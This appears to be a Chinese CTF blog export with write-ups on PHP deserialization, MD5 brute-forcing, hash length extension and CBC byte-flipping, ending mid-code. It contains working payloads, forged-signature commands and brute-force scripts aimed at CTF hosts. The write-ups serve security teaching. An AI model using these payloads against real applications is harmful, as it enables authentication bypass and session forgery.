    <url>%2F2017%2F12%2F25%2F%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[几个序列号漏洞的例子。 题目1神盾局的秘密 看下逻辑看源码发现了1&lt;img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/&gt; 这里有个文件包含，base64 解码之后得到 shield.jpg 尝试读取 index.php 123456789&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 利用同样的方法读取 shield.php 12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 最简单的序列化漏洞直接利用脚本生成序列化的值1234567891011121314151617181920&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;$q = new Shield();$q-&gt;file = 'pctf.php';echo serialize($q);?&gt; 或者：12345678910111213&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; &#125;$q = new Shield();$q-&gt;file = 'pctf.php';echo serialize($q);?&gt; payload 如下： 题目2源代码：12345678910111213141516171819202122232425&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;if (isset($_GET['pass'])) &#123; $pass = $_GET['pass']; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = "*"; if ($o-&gt;secret === $o-&gt;enter) echo "Congratulation! Here is my secret: ".$o-&gt;secret; else echo "Oh no... You can't fool me"; &#125; else echo "are you trolling?";&#125;?&gt; 分析：一个序列化过后的字符串与类中的变量始终保持相同，可以想到引用 a=&amp;b123456789101112poc： &lt;?php class just4fun &#123; var $enter; var $secret; function just4fun() &#123; $this-&gt;enter=&amp;$this-&gt;secret; &#125; &#125; echo serialize(new just4fun()); ?&gt; 输出：1O:8:"just4fun":2:&#123;s:5:"enter";N;s:6:"secret";R:2;&#125; payload：1pass=O:8:"just4fun":2:&#123;s:5:"enter";N;s:6:"secret";R:2;&#125; 题目3 点击没反应 根据提示加上 ?hint=1 发现源码 源码：12345678910111213141516171819&lt;?phperror_reporting(0);include_once("flag.php");$cookie = $_COOKIE['ISecer'];if(isset($_GET['hint']))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) === "$KEY")&#123; echo "$flag";&#125;else &#123;?&gt;&lt;?php&#125;$KEY='ISecer:www.isecer.com';?&gt; 分析：这题很奇怪要传一个 cookie 名为 ISecer 的反序列的值。并且反序列后的值要全相等于 ”$KEY”这里要注意是有双引号。而且$KEY的传值是在此之后的。所以反序列的值不是 ’ISecer:www.isecer.com’。难道一开始 $key 的值是 “”???我们要得到的值是 string(0) “” 所以序列化该值即可。 题目4bool 绕过 点击”登录”没反应，右击查看源代码，发现这么一段： 这里说明要为用户名传入一个字符串，并且它经过md5加密后要等于 0。在某些情况下，PHP 会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: ‘3’ == ‘3ascasd’ 结果为 true。因此只要找到一个字串加密后第一个字符为0即可，这里提供几个：240610708，aabg7XSs，aabC9RqS在用户名处输入以上其中一个字符串，提交后出现提示： /user.php?fame=hjkleffifer 访问得到源代码：1234567&lt;?php$unserialize_str = $_POST['password'];$data_unserialize = unserialize($unserialize_str);if($data_unserialize['user'] == '???' &amp;&amp; $data_unserialize['pass']=='???')&#123; print_r($flag);&#125;?&gt; 分析：代码意思是把 post 提交的 password 值经过”反序列化”得到一个数组，要求数组里的 user 和 pass 都等于某个值时就打印 flag。但是我们不知道两处 ??? 到底是什么，因此无法考虑用 php 函数构造这样的值。别忘了还有一个提示： “伟大的科学家 php 方言道：成也布尔，败也布尔” ，bool 类型的 true 跟任意字符串可以弱类型相等。因此我们可以构造 bool 类型的序列化数据 ，无论比较的值是什么，结果都为true。（a 代表 array，s代表 string，b 代表 bool，而数字代表个数/长度） 构造 password 值为：1a:2:&#123;s:4:"user";b:1;s:4:"pass";b:1;&#125; 在密码栏中提交构造的值，即可获取 flag: ctf{dwduwkhduw5465}]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD5 爆破问题]]></title>
    <url>%2F2017%2F12%2F24%2FMD5%E7%88%86%E7%A0%B4%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[几道 MD5 爆破问题 题目1md5多一位 代码如下：1234mymd5="d78b6f302l25cdc811adfe8d4e7c9fd34"for i in xrange(33): newmd5=mymd5[:i]+mymd5[i+1:] print newmd5 难道是逐个解密？？ 不对。 MD5 包含0-9a-f共16个字符，不存在 l 很明显应该去掉 l 对 “d78b6f30225cdc811adfe8d4e7c9fd34” 进行解密即可。 题目2代码如下：1234567891011121314151617181920212223242526import hashlibdef test(): count=0 md5='38e4c352809e150186920aac37190cbc' str='flag&#123;www_shiyanbar_com_is_very_good_' while count==0: for i in range(32,127): a=chr(i) for i in range(32,127): b=chr(i) for i in range(32,127): c=chr(i) for i in range(32,127): d=chr(i) test=str+a+b+c+d+'&#125;' m=hashlib.md5() m.update(test) m=m.hexdigest() if(cmp(m,md5)==0): count=1 print 'ok' print testif __name__ == '__main__': test() pass 题目3md5加盐爆破 题目：1You have found a passwd file containing salted passwords. An unprotected configuration file has revealed a salt of 5948. The hashed password for the 'admin' user appears to be 81bdf501ef206ae7d3b92070196f7e98, try to brute force this password. python 脚本如下：123456789101112131415161718# -*- coding:utf -*-from hashlib import md5def foo(): f=open('1.txt','rb').readlines() salt='5948' m='81bdf501ef206ae7d3b92070196f7e98' for line in f: t=line.strip()+salt t=md5(t).hexdigest() if t==m: print line.strip() break passif __name__ == '__main__': foo() print 'ok']]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>md5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hash长度扩展攻击]]></title>
    <url>%2F2017%2F12%2F23%2Fhash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[hash 长度扩展攻击原理和实例 sha1 的 hash 原理谈一下对 sha1 加密的理解。 首先，当 hash 函数拿到需要被 hash 的字符串后，先将其字节长度整除 64，取得余数。如果该余数正好等于 56，那么就在该字符串最后添加上 8 个字节的长度描述符（具体用bit表示）。如果不等于 56，就先对字符串进行长度填充，填充时第一个字节为 hex(80)，其他字节均用 hex(00) 填充，填充至余数为 56 后，同样增加 8 个字节的长度描述符（该长度描述符为需要被 hash 的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。 补位完成后，字符串以 64 位一组进行分组（因为上面的余数为 56,加上 8 个字节的长度描述符后，正好是 64 位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的 registers 值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的 registers 值就是最后的 hash 值。 在 sha1 的运算过程中，为确保同一个字符串的 sha1 值唯一，所以需要保证第一次 registers 的值也唯一。所以在 sha1 算法中，registers 具有初始值（固定的）。如上图中的 registers 值 0。Hash 值的随机性完全依赖于进行 “复杂的数学变化” 时输入的 registers 值和该次运算中字符串分组的数据。如果进行 “复杂数学变化” 时输入的 registers 值和该次运算的字符串分组相同，那么他们各自生成的新的 registers 值也相同。 举个例子当需要被 hash 的字符串为 str_a = “123456”，程序首先判断，len(str_a) % 64 == 56 是否成立。这里很明显不成立。那么程序就进行补位操作。首先补位成余数为 56 的长度。 如上图，蓝色字体就为程序对该字符串进行补位的数据。当满足 len(str_a) % 64 == 56 后，程序就在该字符串的后面添加 8 个字节的长度描述符。注意，此处的长度为原始需要被 hash 的长度。也就是1len(str_a) = 6 字节 *8bit/字节 = 48bit = 0x30bit。 补位+长度描述符 = 64 个字节，正好是一个分组。所以此处只要进行一次复杂的数学变化就可以了。程序根据该 64 个字节的数据和 registers 值 0 生成新的 registers 值 1。那么该新的 registers 值 1 就是 str_a 的 sha1 值。 如何利用？讲了这么多，好像都没讲到如何利用该扩展攻击。那么下面，重点来了。 简单来说，就是服务器上会生成一个 salt 值，该 salt 值你是不可预测的。但是你又知道了 sha1(salt+filename)的值，该 filename 的值你也是知道的。假设此处的 filename 的值 report.pdf，最后 sha1 的值为：0a8d538b724c6f2b4288526eb540ee7c。为了方便理解，我们继续假设 salt 的长度为 16 位。 将上图的字符串进行 sha1 操作时，同样先进行整除，然后取余。最后再补上 8 位的长度描述符。补位+添加长度描述符后的字符串如下图： 该长度也就满足了 64 位的分组，只需要进行一次 “复杂的数学运算” 就可以得到最后的sha1值了。下面请各位看官思考如何进行下面一个字符串的 sha1 操作。 同样，还是先进行分组。由于该字符串的长度大于 64 个字节，且小于 128 个字节，所以要分成两组，需要进行两次“复杂的数学运算”。这个时候我们发现，第一个分组的数据和上图中补码后的数据完全一样，又因为他们都是第一个分组，初始的 registers 值也一样。那么经过第一轮“复杂的数学运算”，他们各自生成的 registers 值也同样是相同的。唯一不同的是，由于上面的长度小于 64 字节，所以只需要进行一轮运算便得到了最后的 sha1 值。然后这里的字符串有两个分组，需要将第一轮更新的 registers 值（也就是第一轮运算出来的 sha1 值）作为第二轮“复杂的数学运算”的 registers 值，然后才能得出最终的 sha1 值。 根据上面例子就说明，如果 salt 的值你不知道，但是你知道长度，又知道 sha1(salt)，那么就也就可以知道 sha1(salt+“填充数据”+“任意可控数据”).这里的 salt+“填充数据”就是对 salt 进行 sha1 时所补全的数据+最后8位的长度描述符。一般来说，salt+”填充数据”的长度就是64字节，正好是一个分组。如果 salt 的长度就大于了56个字节，那么加入填充数据后的长度应该是N个64字节，等于 N 个分组。如果最后一块长度大于 56 或等于 64 时一直填充到多出一个块并且该块长度为 56 字节。为什么？你可以想象，sha1 程序再对（salt+“填充数据”+“任意可控数据”）进行 hash 时，只需要进行第二轮及第二轮以后的运算。因为第一轮运算后的 registers 值就是 sha1(salt)的值，该值你已经知道了。 PS : MD5、SHA-1、SHA-2 类似 hash 长度扩展攻击实例实例1 源码如下：123456789101112131415161718192021222324252627282930313233&lt;?php$flag = "XXXXXXXXXXXXXXXXXXXXXXX";$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!$username = $_POST["username"];$password = $_POST["password"];if (!empty($_COOKIE["getmein"])) &#123; if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") &#123; if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) &#123; echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); &#125; else &#123; die ("Your cookies don't match up! STOP HACKING THIS SITE."); &#125; &#125; else &#123; die ("You are not an admin! LEAVE."); &#125;&#125;setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE["source"])) &#123; setcookie("source", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE["source"] != 0) &#123; echo ""; // This source code is outputted here &#125;&#125;?&gt; python 代码如下：12345678910111213141516171819202122232425'''samplehash='571580b26c65f306376d4f64e53cb5c7's1='0x'+samplehash[6:8]+samplehash[4:6]+samplehash[2:4]+samplehash[0:2]s2='0x'+samplehash[14:16]+samplehash[12:14]+samplehash[10:12]+samplehash[8:10]s3='0x'+samplehash[22:24]+samplehash[20:22]+samplehash[18:20]+samplehash[16:18]s4='0x'+samplehash[30:32]+samplehash[28:30]+samplehash[26:28]+samplehash[24:26]print s1,'\n',s2,'\n',s3,'\n',s4'''#!/usr/bin/env python# -*- coding: utf-8 -*-# @Author：DshtAngerimport my_md5#reference:# http://www.freebuf.com/articles/web/69264.html#problem link:# http://ctf4.shiyanbar.com/web/kzhan.phpsamplehash="571580b26c65f306376d4f64e53cb5c7"#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书s1=0xb2801557s2=0x06f3656cs3=0x644f6d37s4=0xc7b53ce5print type(s1) exp：12345secret = "a"*15secret_admin = secret+'adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin'r = my_md5.deal_rawInputMsg(secret_admin)inp = r[len(r)/2:]print "getmein:"+my_md5.run_md5(s1,s2,s3,s4,inp) burp抓包改包：123username=adminpassword=admin+\x80\x00……admin\x80\x00要在hex里面修改 实例2源代码：1234567891011121314151617181920212223242526272829&lt;?php$SECRET="234098761";echo serialize(false)."&lt;br /&gt;";echo serialize(true)."&lt;br /&gt;";$auth=false;if (isset($_COOKIE["auth"]))&#123; $auth=unserialize($_COOKIE["auth"]); //先给$auth赋一个真值 $hsh=$_COOKIE["hsh"]; echo $_COOKIE["auth"]."&lt;br/&gt;"; if ($hsh !== hash("sha256",$SECRET.strrev($_COOKIE["auth"]))) &#123; $auth=false; echo "hsh is error! &lt;br /&gt;"; &#125;&#125;else&#123; $auth = false; $s=serialize($auth); setcookie("auth",$s); setcookie("hsh",hash("sha256",$SECRET.strrev($s)));&#125;if ($auth) echo "succusel &lt;br/&gt;";else echo "fails &lt;br /&gt;";?&gt; 分析：strrev() 反转字符串123456 ./hash_extender -f sha256 -l 9 -d ';0:b' -s feab615a09e9c09c1c79e806337bf73450786f1026ef88cf23a0c775b9c28391 -a ';1:b' --out-data-format=html Type: sha256 Secret length: 9 New signature: 4cd85bfa32cfded3b01ed2a18af281c7dfd8118fdb3ce2d0d729f48fecbb1560 New string: %3b0%3ab%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%3b1%3ab 从上面算得的值hash值是 sha256(key || padding || append) append的值是true的值。将cookie中的hsh换成上面的生成的新hash,再把上面的string逆序下：1b%3a1%3bh%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b 用上面的字符串修改auth的cookie值，再访问此网页就会认证成功了： 实例3secret长度不知道暴力攻击 题目：flag在管理员手里 用御剑 1.5 扫描 找到 index.php~ 打开都是乱码拷贝至 linux 虚拟机名字改成 .index.php.swpvim -r index.php 保存即可 得到的代码如下：12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type="text/css"&gt; body &#123; background:gray; text-align:center; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $auth = false; $role = "guest"; $salt = if (isset($_COOKIE["role"])) &#123; $role = unserialize($_COOKIE["role"]); $hsh = $_COOKIE["hsh"]; if ($role==="admin" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE["role"]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; &#125; else &#123; $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); &#125; if ($auth) &#123; echo "&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo "&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"; &#125; ?&gt; &lt;/body&gt;&lt;/html&gt; 很明显secret长度不知道，只能通过爆破 python 代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041# -*- coding:utf-8 -*-from urlparse import urlparsefrom httplib import HTTPConnectionfrom urllib import urlencodeimport jsonimport timeimport osimport urllibdef gao(x, y): #print x #print y url = "http://web.jarvisoj.com:32778/index.php" cookie = "role=" + x + ";hsh=" + y #print cookie build_header = &#123; 'Cookie': cookie, 'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Host': 'web.jarvisoj.com:32778', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', &#125; urlparts = urlparse(url) conn = HTTPConnection(urlparts.hostname, urlparts.port or 80) conn.request("GET", urlparts.path, '', build_header) resp = conn.getresponse() body = resp.read() return bodyfor i in xrange(1000): print i # secret len = ??? find_hash = "./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5 -a ';\"nimda\":5:s' --out-data-format=html -l " + str(i) + " --quiet" #print find_hash calc_res = os.popen(find_hash).readlines() hash_value = calc_res[0][:32] attack_padding = calc_res[0][32:] attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1]) ret = gao(attack_padding, hash_value) if "Welcome" in ret: print ret break 将上述代码保存至 hash_extender.py到 hash_extender 的目录下运行 python hash_extender.py 得到如下： 知识点：HashExtender和hashdump使用HashExtender12345678910111213Installing$ pip install HashExtenderUsage&gt;&gt;&gt; import hashext&gt;&gt;&gt; print hashext.md5(data = '123', sign = '109889f941630d269546335f728f3558', length = 5, append = 'test')('123\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00test', 'e5f78513e536615a6f5164ccff96d4d9') ● data - your original signed message ● sign - message signature, MD5(secret + msg) ● length - probable length of secret string ● append - data to append to new string 或者123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657Installing 1. git clone https://github.com/iagox86/hash_extender 2. cd hash_extender 3. make useage ./hash_extender &lt;--data=|--file=&gt; --signature= --format= [options]INPUT OPTIONS-d --data= The original string that we're going to extend.--data-format= The format the string is being passed in as. Default: raw. Valid formats: raw, hex, html, cstr--file= As an alternative to specifying a string, this reads the original string as a file.-s --signature= The original signature.--signature-format= The format the signature is being passed in as. Default: hex. Valid formats: raw, hex, html, cstr-a --append= The data to append to the string. Default: raw.--append-format= Valid formats: raw, hex, html, cstr-f --format= [REQUIRED] The hash_type of the signature. This can be given multiple times if you want to try multiple signatures. 'all' will base the chosen types off the size of the signature and use the hash(es) that make sense. Valid types: md4, md5, ripemd160, sha, sha1, sha256, sha512, whirlpool-l --secret= The length of the secret, if known. Default: 8.--secret-min=--secret-max= Try different secret lengths (both options are required)OUTPUT OPTIONS--table Output the string in a table format.--out-data-format= Output data format. Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy--out-signature-format= Output signature format. Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancyOTHER OPTIONS-h --help Display the usage (this).--test Run the test suite.-q --quiet Only output what's absolutely necessary (the output string and the signature) Example:123456 ./hash_extender -f sha256 -l 9 -d ';0:b' -s feab615a09e9c09c1c79e806337bf73450786f1026ef88cf23a0c775b9c28391 -a ';1:b' --out-data-format=html Type: sha256 Secret length: 9 New signature: 4cd85bfa32cfded3b01ed2a18af281c7dfd8118fdb3ce2d0d729f48fecbb1560 New string: %3b0%3ab%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%3b1%3ab -f 代表加密方式 -l key的长度 -s 原始的hash值 -a 添加的值 –out-data-format 输出的格式 hashdump123456Installinggit clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install 至于想在python里实现hashpump，可以使用hashpumpy这个插件：1pip install hashpumpy Usage12345# hashpumpInput Signature: 571580b26c65f306376d4f64e53cb5c7Input Data: adminInput Key Length: 20Input Data to Add: pcat 或者直接1hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a pcat 就会得到123e67e8f0c05e1ad68020df30bbc505f5admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00pcat 第一个是新的签名，把它设置到cookies的getmein里。第二个先把\x替换为%后，post提交1password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00pcat os 命令介绍os.popen123456789os.system(cmd) 的返回值只会有 0(成功),1,2os.popen(cmd) 会吧执行的 cmd 的输出作为值返回。os.popen() 可以实现一个“管道”，从这个命令获取的值可以继续被调用。而 os.system 不同，它只是调用，调用完后自身退出，可能返回个 0 吧比如，我想得到 ntpd 的进程 id，就要这么做：os.popen('ps -C ntpd | grep -v CMD |awk '&#123; print $1 &#125;').readlines()[0] urlparse将urlstring解析成6个部分，它从urlstring中取得URL，并返回元组 (scheme, netloc, path, parameters, query, fragment)， 12345678910111213141516171819import urlparse&gt;&gt;&gt; url=urlparse.urlparse('http://www.baidu.com/index.php?username=guol')&gt;&gt;&gt; print urlParseResult(scheme='http', netloc='www.baidu.com', path='/index.php', params='', query='username=guol', fragment='')&gt;&gt;&gt; print url.netlocwww.baidu.com&gt;&gt;&gt;urlparse.urlunparse(parts) 从一个元组构建一个url，元组类似urlparse返回的，它接收元组(scheme, netloc, path, parameters, query, fragment)后，会重新组成一个具有正确格式的URL，以便供Python的其他HTML解析模块使用。&gt;&gt;&gt; import urlparse&gt;&gt;&gt; url=urlparse.urlparse('http://www.baidu.com/index.php?username=guol')&gt;&gt;&gt; print urlParseResult(scheme='http', netloc='www.baidu.com', path='/index.php', params='', query='username=guol', fragment='')&gt;&gt;&gt; u=urlparse.urlunparse(url)&gt;&gt;&gt; print uhttp://www.baidu.com/index.php?username=guol Example：123456from urlparse import urlparseurl = "http://web.jarvisoj.com:32778/index.php"urlparts = urlparse(url)print urlparts.hostname,urlparts.port,urlparts.scheme输出：web.jarvisoj.com 32778 http HTTPConnectionHTTPConnection创建对象HTTPConnection(host[, port[, strict[, timeout]]])host: 请求的服务器host，不能带http://开头port: 服务器web服务端口strict: 是否严格检查请求的状态行，就是http1.0/1.1 协议版本的那一行，即请求的第一行，默认为False，为True时检查错误会抛异常timeout: 单次请求的超时时间，没有时默认使用httplib模块内的全局的超时时间 HTTPConnection对象request方法：说明：发送一个请求 原型：12345conn.request(method, url[, body[, headers]])method: 请求的方式，如'GET','POST','HEAD','PUT','DELETE'等url: 请求的网页路径。如：'/index.html'body: 请求是否带数据，该参数是一个字典headers: 请求是否带头信息，该参数是一个字典，不过键的名字是指定的http头关键字 HTTPConnection对象getresponse方法说明：获取一个http响应对象，相当于执行最后的2个回车 原型/实例：1res = conn.getresponse() HTTPResponse对象read方法说明：获得http响应的内容部分，即网页源码 原型：1body = res.read([amt]) amt: 读取指定长度的字符，默认为空，即读取所有内容 实例：12body = res.read() pbody = res.read(10) 返回：网页内容字符串 conn.getheaders()说明： 获得http响应头 Example:1234567891011121314151617181920#!/usr/bin/env python # -*- coding: utf-8 -*- import httplib import urllib def sendhttp(): data = urllib.urlencode(&#123;'@number': 12524, '@type': 'issue', '@action': 'show'&#125;) headers = &#123;"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"&#125; conn = httplib.HTTPConnection('bugs.python.org') conn.request('POST', '/', data, headers) httpres = conn.getresponse() print httpres.status print httpres.reason print httpres.read() if __name__ == '__main__': sendhttp()]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CBC字节翻转攻击]]></title>
    <url>%2F2017%2F12%2F22%2FCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[CBC 字节翻转攻击原理和例题 CBC 字节翻转攻击原理加密过程 Plaintext：待加密的数据。 IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。 Key：被一些如 AES 的对称加密算法使用。 Ciphertext：加密后的数据。 在这里重要的一点是，CBC 工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含 16 字节的块。 因为作者讨厌高数（和译者一样），所以作者造了一些自己的公式（方便记忆）：12● Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块● Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块 注意：正如你所见，前一块的密文用来产生后一块的密文。 Decryption Process12● Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块● Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块 注意：Ciphertext-N-1（密文-N-1）是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方。如果我们改变Ciphertext-N-1（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！You got it? 别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击： 一个例子（CBC Blocks of 16 bytes）比方说，我们有这样的明文序列：1a:2:&#123;s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";&#125; 我们的目标是将 “s:6” 当中的数字6转换成数字 “7”。我们需要做的第一件事就是把明文分成 16 个字节的块：12345● Block 1:a:2:&#123;s:4:"name";● Block 2:s:6:"sdsdsd";s:8● Block 3::"greeting";s:20● Block 4::"echo 'Hello sd● Block 5:sdsd!'";&#125; 因此，我们的目标字符位于块 2，这意味着我们需要改变块1的密文来改变第二块的明文。有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：123● [0] = s● [1] = :● [2] = 6 因此我们要改变在第一个密文块当中，偏移量是 2 的字节。正如你在下面的代码当中看到的，在第 2 行我们得到了整个数据的密文，然后在第 3 行中，我们改变块1中偏移量为 2 的字节，最后我们再调用解密函数。12341. $v = "a:2:&#123;s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";&#125;";2. $enc = @encrypt($v);3. $enc[2] = chr(ord($enc[2]) ^ ord("6") ^ ord ("7"));4. $b = @decrypt($enc); 运行这段代码后，我们可以将数字 6 变为 7： 但是我们在第 3 行中，是如何改变字节成为我们想要的值呢？ 基于上述的解密过程，我们知道有，A = Decrypt(Ciphertext) 与 B = Ciphertext-N-1 异或后最终得到 C = 6。等价于：1C = A XOR B 所以，我们唯一不知道的值就是 A（注：对于B，C来说）（block cipher decryption）;借由 XOR，我们可以很轻易地得到 A 的值：1A = B XOR C 最后，A XOR B XOR C 等于 0。有了这个公式，我们可以在 XOR 运算的末尾处设置我们自己的值，就像这样： A XOR B XOR C XOR “7”会在块 2 的明文当中，偏移量为 2 的字节处得到 7。 下面是相关原理实现的 PHP 源代码：1234567891011121314151617181920212223242526define('MY_AES_KEY', "abcdef0123456789");function aes($data, $encrypt) &#123; $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, ''); $iv = "1234567891234567"; mcrypt_generic_init($aes, MY_AES_KEY, $iv); return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);&#125;define('MY_MAC_LEN', 40);function encrypt($data) &#123; return aes($data, true);&#125;function decrypt($data) &#123; $data = rtrim(aes($data, false), "\0"); return $data;&#125;$v = "a:2:&#123;s:4:\"name\";s:6:\"sdsdsd\";s:8:\"greeting\";s:20:\"echo 'Hello sdsdsd!'\";&#125;";echo "Plaintext before attack: $v\n";$b = array();$enc = array();$enc = @encrypt($v);$enc[2] = chr(ord($enc[2]) ^ ord("6") ^ ord ("7"));$b = @decrypt($enc);echo "Plaintext AFTER attack : $b\n"; 一道ctf题目http://47.93.190.246:49168/index.php 无法用 admin 登录，其它帐号名任意登录。题目提示 CBC 字节翻转 有 .index.php.swp 文件下载。用 vim -r .index.php.swp 打开即，用 :w index.php 另存为 index.php，即可还原出源代码。关键代码段：123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = 